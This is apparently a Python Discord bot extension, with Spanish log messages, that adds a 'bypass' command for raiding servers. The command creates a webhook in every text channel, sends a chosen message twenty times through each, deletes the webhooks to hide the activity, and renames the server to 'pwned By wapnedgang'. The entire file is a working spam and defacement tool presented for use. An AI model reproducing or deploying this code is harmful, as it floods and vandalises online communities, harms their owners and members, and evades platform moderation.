import discord
from discord.ext import commands
import asyncio
import datetime
from colored import fg, attr

class Byppas(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def change_server_name(self, guild, new_name):
        try:
            await guild.edit(name=new_name)
            print(f"Changed server name to: {new_name}")
        except Exception as e:
            print(f"Error changing server name: {e}")

    @commands.command(name='bypass')
    async def rename_webhooks(self, ctx, new_name, *, message_content):
        guild = ctx.guild
        channels = guild.text_channels

        red_color = fg('red')
        reset_color = attr('reset')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        async def send_messages(channel):
            try:
                webhook = await channel.create_webhook(name="wap")
                print(f"[{red_color}{timestamp}{reset_color}] Create webhook {channel.name}")

                for _ in range(20):
                    await webhook.send(content=message_content)
                print(f"[{red_color}{timestamp}{reset_color}] Mission Completed {channel.name}")

                await webhook.delete()
                print(f"[{red_color}{timestamp}{reset_color}] Delete webhook: {channel.name}")

            except Exception as e:
                print(f"[{red_color}{timestamp}{reset_color}] Error en el canal {channel.name}: {e}")

        tasks = [send_messages(channel) for channel in channels]
        await asyncio.gather(*tasks)

        await self.change_server_name(guild, "pwned By wapnedgang")

        await ctx.send(f"```Se enviaron 20 mensajes por webhooks en cada canal y se cambió el nombre del servidor.```")

def setup(bot):
    bot.add_cog(Byppas(bot))
